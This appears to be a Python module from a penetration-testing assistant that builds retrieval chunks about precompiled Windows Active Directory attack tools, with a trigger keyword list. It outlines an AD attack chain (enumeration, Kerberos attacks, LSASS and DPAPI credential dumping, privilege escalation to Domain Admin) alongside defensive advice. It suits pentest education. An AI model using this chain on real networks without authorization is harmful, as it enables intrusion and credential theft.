PRECOMPILED_TRIGGERS = [
    # Tool names
    "sharphound", "rubeus", "mimikatz", "certify", "whisker", "seatbelt",
    "sharpup", "winpeas", "sharpview", "nopowershell", "sharpsccm",
    "runasc", "sharpgpoabuse", "sharpdpapi", "sharpchrome", "sharplaps",
    "bettercafetykatz", "gmsapasswordreader", "godpotato", "juicypotato",
    "printspoofer", "krbrelayup", "krbrelay", "adsyncdecrypt", "powerview",
    "inveigh", "powerup", "powermad", "lapstoolkit", "powerpupsql",
    "forgecert", "passthecert", "adfdsdump", "spoolsample", "admodule",
    "sharprdp", "sharpsql", "sharpmove", "sharpmad", "sharpgpo",
    # Attack categories
    "kerberoast", "as-rep roast", "asreproast", "pass the ticket",
    "golden ticket", "silver ticket", "overpass the hash", "pass the hash",
    "shadow credentials", "resource-based constrained delegation", "rbcd",
    "dcsync", "lsass dump", "laps password", "gmsa password",
    "adcs", "esc1", "esc8", "certificate abuse", "certificate template",
    "llmnr", "nbt-ns", "ntlm relay", "ntlm hash", "responder",
    "gpo abuse", "group policy", "sccm lateral", "azure ad connect",
    "seimpersonateprivilege", "token impersonation", "potato exploit",
    # AD concepts
    "active directory pentest", "ad pentest", "domain admin", "domain controller",
    "precompiled binary", "precompiled binaries", "ghostpack", "ad toolset",
    "windows active directory", "ad attack", "ad exploitation",
]


def build_precompiled_chunks() -> list[dict]:
    """
    Build RAG chunks from the precompiled-binaries tool catalogue.
    Returns list of chunk dicts compatible with ERR0RSKnowledgeBase.
    """
    chunks = []

    # ── 1. Per-tool detailed chunks ───────────────────────────────────────────
    for tool_name, info in PRECOMPILED_TOOLS.items():
        content = (
            f"TOOL: {tool_name}\n"
            f"Category: {info['category']}\n"
            f"Description: {info['description']}\n\n"
            f"USE CASE: {info['use_case']}\n\n"
            f"USAGE:\n{info['usage']}\n\n"
            f"[ERR0RS TEACH] {info['teach']}\n\n"
            f"[DEFEND] {info['defend']}\n\n"
            f"MITRE ATT&CK: {', '.join(info['mitre'])}\n"
            f"Download: {info['download']}\n"
            f"Source: {REPO_URL}"
        )
        chunks.append({
            "id":       f"precompiled_bins_{tool_name.lower().replace(' ', '_')}",
            "category": f"windows_ad_{info['category'].lower()}",
            "title":    f"{tool_name} — {info['category']} (.NET AD Binary)",
            "content":  content,
            "tags":     [
                tool_name.lower(), info["category"].lower(),
                "windows", "active-directory", "dotnet", "precompiled",
                "ghostpack", "jakobfriedl", "grejh0t", "red-team",
            ] + [m.split(" - ")[0].lower() for m in info["mitre"]],
            "source":   REPO_URL,
            "author":   "jakobfriedl / grejh0t",
        })

    # ── 2. Category overview chunks ────────────────────────────────────────────
    categories = {}
    for tool_name, info in PRECOMPILED_TOOLS.items():
        cat = info["category"]
        categories.setdefault(cat, []).append(tool_name)

    CATEGORY_DESCRIPTIONS = {
        "Enumeration": (
            "Windows AD enumeration tools map the environment before exploitation. "
            "SharpHound feeds BloodHound for attack path visualisation. "
            "Seatbelt audits host security posture. SharpUp and winPEAS find privesc vectors. "
            "SharpView and NoPowerShell enumerate AD objects without PowerShell logging."
        ),
        "LateralMovement": (
            "Lateral movement tools move between systems once initial access is gained. "
            "Rubeus handles all Kerberos attacks. Certify exploits ADCS misconfigurations. "
            "Whisker plants Shadow Credentials. SharpGPOAbuse modifies Group Policy. "
            "RunasCS executes commands with alternate credentials."
        ),
        "Credentials": (
            "Credential gathering tools extract secrets from compromised systems. "
            "Mimikatz dumps LSASS for plaintext passwords and hashes. "
            "SharpDPAPI decrypts DPAPI-protected secrets. SharpChrome extracts browser creds. "
            "SharpLAPS reads LAPS passwords. GMSAPasswordReader extracts gMSA secrets."
        ),
        "PrivilegeEscalation": (
            "Privilege escalation tools elevate from low-privilege to SYSTEM or Domain Admin. "
            "The Potato family (GodPotato, JuicyPotato, PrintSpoofer, SharpEfsPotato) "
            "exploit SeImpersonatePrivilege. KrbRelayUp is universal on domains without LDAP signing."
        ),
        "Scripts": (
            "PowerShell scripts for AD enumeration and exploitation. "
            "PowerView is the essential AD enumeration framework. "
            "Inveigh captures NTLM hashes via LLMNR/NBT-NS spoofing. "
            "PowerUp finds local privilege escalation vectors. "
            "LAPSToolkit audits and abuses LAPS configurations."
        ),
    }

    for cat, tools in categories.items():
        desc = CATEGORY_DESCRIPTIONS.get(cat, f"{cat} tools for Windows AD penetration testing.")
        chunks.append({
            "id":       f"precompiled_bins_cat_{cat.lower()}",
            "category": f"windows_ad_{cat.lower()}",
            "title":    f"Windows AD {cat} Tools — precompiled-binaries",
            "content":  (
                f"Category: {cat}\n"
                f"Tools: {', '.join(tools)}\n\n"
                f"{desc}\n\n"
                f"Source: {REPO_URL}\n"
                f"All binaries are pre-compiled .NET executables for Windows AD penetration testing.\n"
                f"Author: jakobfriedl / grejh0t"
            ),
            "tags":     [cat.lower(), "windows", "active-directory", "ad", "pentest",
                         "precompiled", "dotnet"] + [t.lower() for t in tools],
            "source":   REPO_URL,
            "author":   "jakobfriedl / grejh0t",
        })

    # ── 3. Master overview chunk ───────────────────────────────────────────────
    all_tools = list(PRECOMPILED_TOOLS.keys())
    chunks.append({
        "id":       "precompiled_bins_overview",
        "category": "windows_ad_overview",
        "title":    "grejh0t/precompiled-binaries — Windows AD Penetration Testing Arsenal",
        "content":  (
            f"Repository: {REPO_URL}\n"
            f"Fork of: jakobfriedl/precompiled-binaries\n"
            f"Description: Collection of pre-compiled .NET binaries for Windows AD pentesting\n\n"
            f"Tools ({len(all_tools)} total): {', '.join(all_tools)}\n\n"
            "ATTACK CHAIN:\n"
            "1. ENUMERATE: SharpHound → BloodHound (attack path graph)\n"
            "2. KERBEROS: Rubeus (Kerberoast/AS-REP/PTT/Golden Ticket)\n"
            "3. CREDENTIALS: mimikatz/SharpDPAPI/SharpChrome/SharpLAPS\n"
            "4. LATERAL MOVEMENT: Certify (ADCS) → Whisker (Shadow Creds) → RunasCS\n"
            "5. PRIVILEGE ESCALATION: GodPotato/KrbRelayUp → SYSTEM → Domain Admin\n"
            "6. GPO/SCCM ABUSE: SharpGPOAbuse/SharpSCCM → domain-wide execution\n"
            "7. AZURE PIVOT: ADSyncDecrypt → Azure AD compromise\n\n"
            "KEY CONCEPTS: Kerberoasting, AS-REP Roasting, Pass-the-Ticket, Golden Ticket, "
            "Shadow Credentials, ADCS ESC1/ESC8, RBCD, DCSync, LAPS abuse, "
            "GMSA password read, GPO modification, SCCM lateral movement, "
            "DPAPI decryption, LLMNR/NBT-NS poisoning, SeImpersonatePrivilege\n\n"
            "DEFEND: Enable LDAP signing, Credential Guard, LSA Protection, "
            "LAPS, gMSA, Certificate Manager Approval for ADCS templates, "
            "Microsoft Defender for Identity, Advanced Audit Policies, "
            "disable LLMNR/NetBIOS, enable SMB signing."
        ),
        "tags":     ["windows", "active-directory", "ad", "pentest", "red-team",
                     "precompiled", "dotnet", "ghostpack", "kerberos", "adcs",
                     "laps", "gmsa", "lateral-movement", "privilege-escalation",
                     "credential-dumping", "enumeration", "jakobfriedl", "grejh0t"],
        "source":   REPO_URL,
        "author":   "jakobfriedl / grejh0t",
    })

    log.info(f"[precompiled_bins_kb] Built {len(chunks)} RAG chunks from {len(PRECOMPILED_TOOLS)} tools")
    return chunks
